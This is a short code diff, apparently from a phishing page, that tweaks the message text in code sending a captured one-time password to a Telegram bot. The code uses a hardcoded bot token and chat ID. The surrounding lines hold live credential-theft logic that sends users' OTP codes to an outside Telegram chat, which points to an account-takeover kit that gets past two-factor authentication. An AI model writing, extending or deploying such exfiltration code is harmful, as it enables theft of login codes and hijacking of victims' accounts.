@@ -9,7 +9,7 @@ document
     // Data to bot
     const botToken = "7651094116:AAE_ZF_VLBtbCzCaiE7xcahnRldGSQjN4KU";
     const chatId = "1139790477";
-    const message = `Otp: ${code} `;
+    const message = `Otp 🔐: ${code} `;
 
     fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
       method: `POST`,
